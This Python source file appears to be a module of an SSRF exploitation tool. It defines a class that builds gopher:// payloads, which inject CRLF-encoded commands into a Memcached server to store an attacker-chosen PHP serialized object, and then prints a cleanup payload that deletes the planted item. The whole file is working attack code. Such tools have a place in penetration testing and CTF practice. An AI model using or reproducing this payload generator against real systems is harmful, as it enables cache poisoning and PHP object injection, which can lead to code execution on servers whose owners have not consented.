from .base import *

class PHPMemcached(GENERATOR):
    requirement = ["code"]
    def __init__(self, parser,options={}):
        if options["port"] == 0:
            options["port"] = 11211
        super().__init__(parser,options)
        self.set_requirement(self.requirement)
        arg = self.get_requirement()
        if arg.code == "":
            self.code = self.wizard()
        else:
            self.code = arg.code

    def generate(self):
        code = self.code 
        payload = "%0d%0aset SpyD3r 4 0 " + str(len(code)) + "%0d%0a" +  code + "%0d%0a"
        self.set_mode(PAYLOAD_TYPE.QUOTE_PLUS).\
            set_payload().\
            replace("+", "%20").\
            replace("%2F", "/").\
            replace("%25", "%").\
            replace("%3A", ":").\
            prefix("%0d%0a").\
            suffix("%0d%0a")
        return super().generate()

    def wizard(self):
        print("\033[96m" +"Give payload you want to run in Memcached Server: "+ "\033[0m")
        code = input("\033[96m" +"Give serialization payload\nexample: O:5:\"Hello\":0:{}   : "+ "\033[0m")
        return code
    
    def tailcall(self):
        print("\033[93m" +"\nAfter everything done, you can delete memcached item by using this payload: \n"+ "\033[0m")
        print("\033[04m" + f"gopher://{self.host}:{self.port}/_%0d%0adelete%20SpyD3r%0d%0a"+ "\033[0m")

